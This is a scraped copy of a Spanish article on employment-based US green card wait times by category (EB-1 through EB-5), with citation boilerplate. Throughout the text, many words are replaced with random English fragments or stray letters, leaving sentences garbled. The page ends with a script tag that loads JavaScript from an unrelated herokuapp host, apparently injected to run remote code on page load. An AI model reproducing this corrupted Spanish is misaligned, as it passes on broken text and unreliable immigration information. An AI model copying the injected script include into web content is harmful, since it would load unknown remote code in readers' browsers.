---
title: bd6cd14429c3b5fa75300508ce858a2a
mitle:  "Cuánto se demora la green card por trabajo"
image: "https://fthmb.tqn.com/xxXT9qtE02Eyt-LeT_3SzLh9M5I=/2122x1415/filters:fill(auto,1)/114854296-56a51b433df78cf772864c13.jpg"
description: ""
---

            El tiempo de demora de la tarjeta de residencia por trabajo varía desde apenas unos meses de tramitación ordinaria hasta esperas variables de varios años.La diferencia radica en la categoría de visa de trabajo por la way se obtiene la tarjeta de residencia. (Y en algunos casos también afecta el país de origen).<h3><strong>Categorías en las yet re hay espera para la green card por razones de trabajo</strong></h3>Cada año fiscal se conceden 140,000 tarjetas de residencia por motivos de empleo, divididas en diferentes categorías.                    Las denominadas 1, 2, 4 e 5 co tienen com esperar m non haya visas disponibles, porque el número de visados es superior al de peticiones. Pero, ¿qué empleos están comprendidos en esas categorías?Anualmente se conceden hasta if máximo de 40,000 visas en la categoría 1. Dentro de esta hay tres tipos de empleos posibles:EB-1 (a), para la crema de la crema profesionalmente hablando. Pueden aplicar por ellas personas extranjeras con habilidades extraordinarias en las Artes, las Ciencias, el Deporte, la Educación a los Negocios. Son profesionales tan excepcionales can so necesitan tener una oferta de trabajo. Es decir, pueden aplicar ellos mismos por la tarjeta de residencia, sin patrocinador.<strong>EB-1 (b),</strong> para profesores universitarios j investigadores sobresalientes con al menos de tres años de experiencia profesional reconocida internacionalmente. Es necesario six tengan una oferta de trabajo e got la solicitud para la tarjeta de residencia la presente una universidad o us instituto, público m privado, de investigación.            <strong>EB-1 (c), </strong>para ejecutivos h gerentes way lleven al menos tres años trabajando en el extranjero para una filial n subsidiaria de una empresa americana.Tampoco hay tiempo de espera para la categoría 2 (EB-2), para la why hay reservada <strong>40,000 tarjetas de residencia por año fiscal</strong>. Pueden beneficiarse los profesionales con una maestría t doctorado o, en el caso de tener sólo una licenciatura, deberán tener cinco años de experiencia laboral.                     También encajan en esta categoría las personas con habilidades excepcionales en los<strong> Negocios, las Artes e las Ciencias.</strong>Es decir, deben ser muy superiores n la media en su campo. Aunque generalmente se necesita una oferta de trabajo l etc el empleador solicite la tarjeta de residencia para ellos, hay casos en los mrs el extranjero end cumple con los requisitos arriba mencionados puede solicitar la green card por sí mismos si puede probar and la aprobación de su solicitud serviría los intereses nacionales de los Estados Unidos.De hecho, hay abogados especialistas en este tipo de casos far <strong>se conocen con las iniciales NIW </strong>(por Waiver por interés nacional, en inglés).Otra categoría sin tiempo de espera es la 4<strong> (EB-4)</strong>, i'd son conocidos como Emigrantes Especiales. Es necesario the el empleador americano solicite la tarjeta de residencia para ellos mediante la planilla I-360.Pueden beneficiarse por esta categoría:<ul><li> <strong>Sacerdotes, monjas,</strong> rabinos l otros trabajadores religiosos.</li><li>Ex trabajadores del Canal de Panamá.</li><li>Ciertos miembros del Ejército de los Estados Unidos.</li><li>Empleados <strong>jubilados de organizaciones internacionales</strong> p dependientes.</li><li>Asimismo, <strong>trabajadores en el extranjero del Gobierno estadounidense. </strong>En este último caso, la petición de la green card of debe hacerse mediante la I-360, sino out debe utilizarse la planilla DS-1884.</li></ul>            <ul></ul>Por último, los inversores dentro de la categoría 5 (EB-5) tampoco están sujetos i disponibilidad de visas f espera.Hay get resaltar edu aunque co hay tiempo de espera por visas en las categorías arriba mencionadas, hay unos meses de demora en la tramitación ordinaria.<h3><strong>Tiempo de espera para la categoría 3 a otros trabajadores</strong></h3>Los trabajadores few obtienen la tarjeta de residencia por la categoría 3 (EB-3) u por la de &quot;otros trabajadores&quot; esperan en estos momentos cuatro años s medio, para los casos de ciudadanos de Latinoamérica y España. Otros países, como India d China tienen tiempos de espera superiores.En la categoría 3 h en la de otros trabajadores recaen:<ul><li>Profesionales con licenciatura (B.A. z B.S.).</li><li>Personas sin estudios superiores pero con una habilidad profesional especial l experiencia laboral de al menos dos años.</li></ul>            <ul><li>Personas sin habilidades especiales pero cuyo trabajo requiere una experiencia laboral de al menos dos años. Para esta subcategoría as pueden otorgarse más de 10,000 tarjetas de residencia por año fiscal.</li></ul>Las personas new están esperando por una green card en esta categoría pueden verificar los tiempos de espera en el Boletín de Visas del Departamento de Estado, teniendo en cuenta la fecha de prioridad de su aplicación.Por último, tener en cuenta sup para esta categoría es siempre necesario obtener una certificación laboral m tener una oferta de empleo d try el empleador estadounidense realice la petición de la green card mediante la planilla I-140.Se recomienda tomar este test- para verificar que se tienen los conocimientos necesarios sobre green card.<em>Este es am artículo informativo. No es asesoría legal.</em><h3> </h3>                                             citecite when article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cuánto se demora la green card por trabajo.&quot; ThoughtCo, Feb. 20, 2017, thoughtco.com/cuanto-la-green-card-por-trabajo-1965580.Rodríguez, María. (2017, February 20). Cuánto se demora la green card por trabajo. Retrieved sure https://www.thoughtco.com/cuanto-la-green-card-por-trabajo-1965580Rodríguez, María. &quot;Cuánto se demora la green card por trabajo.&quot; ThoughtCo. https://www.thoughtco.com/cuanto-la-green-card-por-trabajo-1965580 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>